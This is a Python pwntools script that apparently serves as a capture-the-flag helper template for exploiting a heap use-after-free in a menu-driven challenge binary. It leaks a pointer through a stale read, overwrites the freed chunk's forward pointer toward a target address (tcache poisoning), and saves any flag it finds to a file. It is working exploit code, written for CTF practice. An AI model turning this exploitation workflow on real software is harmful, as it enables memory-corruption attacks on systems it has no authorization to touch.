#!/usr/bin/env python3
from pwn import *
import os
import re

BIN = os.getenv("BIN", "./chall")
LIBC = os.getenv("LIBC", "./libc.so.6")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.log_level = os.getenv("LOG", "info")

ALLOC = os.getenv("ALLOC", "1")
FREE = os.getenv("FREE", "2")
EDIT = os.getenv("EDIT", "3")
SHOW = os.getenv("SHOW", "4")
PROMPT = os.getenv("PROMPT", "> ").encode()
SIZE_PROMPT = os.getenv("SIZE_PROMPT", "size: ").encode()
INDEX_PROMPT = os.getenv("INDEX_PROMPT", "index: ").encode()
DATA_PROMPT = os.getenv("DATA_PROMPT", "data: ").encode()


def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    match = re.search(FLAG_RE, data)
    if match:
        flag = match.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


def alloc(io, size, data=b"A"):
    io.sendlineafter(PROMPT, ALLOC.encode())
    io.sendlineafter(SIZE_PROMPT, str(size).encode())
    io.sendlineafter(DATA_PROMPT, data if isinstance(data, bytes) else data.encode())


def free(io, idx):
    io.sendlineafter(PROMPT, FREE.encode())
    io.sendlineafter(INDEX_PROMPT, str(idx).encode())


def edit(io, idx, data):
    io.sendlineafter(PROMPT, EDIT.encode())
    io.sendlineafter(INDEX_PROMPT, str(idx).encode())
    io.sendlineafter(DATA_PROMPT, data if isinstance(data, bytes) else data.encode())


def show(io, idx, tail=PROMPT):
    io.sendlineafter(PROMPT, SHOW.encode())
    io.sendlineafter(INDEX_PROMPT, str(idx).encode())
    return io.recvuntil(tail, timeout=2)


def parse_first_qword_blob(blob: bytes) -> int | None:
    chunks = blob.split(b"\n")
    for chunk in chunks:
        if len(chunk) >= 6:
            return u64(chunk[:8].ljust(8, b"\x00"))
    return None


if __name__ == "__main__":
    log.info("heap-UAF helper template loaded")
    log.info("First prove this exact sequence: free -> stale show/edit still works on same index.")
    log.info("Use this helper only after ctf-pwn-heap-menu-map and ctf-pwn-heap-reduction-check confirm a UAF-style primitive.")

    if os.getenv("RUN", "0") != "1":
        raise SystemExit("Dry-run only. Set RUN=1 after confirming stale read/write semantics and prompt strings.")

    io = start()

    # Minimal UAF proof skeleton:
    # 1) alloc victim
    # 2) free victim
    # 3) show victim -> leak candidate
    # 4) edit victim -> fd overwrite candidate
    victim_size = int(os.getenv("VICTIM_SIZE", "32"), 0)
    victim_idx = int(os.getenv("VICTIM_IDX", "0"), 0)
    guard_idx = int(os.getenv("GUARD_IDX", "1"), 0)
    target = int(os.getenv("TARGET", "0"), 0)

    alloc(io, victim_size, b"A" * 8)
    alloc(io, victim_size, b"B" * 8)
    free(io, victim_idx)

    log.info("guard index reserved at %d for anti-consolidation / allocator shaping", guard_idx)

    leak_blob = show(io, victim_idx)
    leak = parse_first_qword_blob(leak_blob)
    if leak is not None:
        log.info("stale leak candidate: %#x", leak)
    else:
        log.warning("no pointer-shaped leak recovered from stale show")

    if target:
        log.info("attempting stale fd overwrite toward %#x", target)
        edit(io, victim_idx, p64(target))
        alloc(io, victim_size, b"C" * 8)
        alloc(io, victim_size, b"D" * 8)
        emit(io.recv(timeout=1) if io.can_recv(timeout=1) else b"")
    else:
        raise SystemExit("UAF proof complete. Set TARGET to continue with fd overwrite / tcache poisoning.")
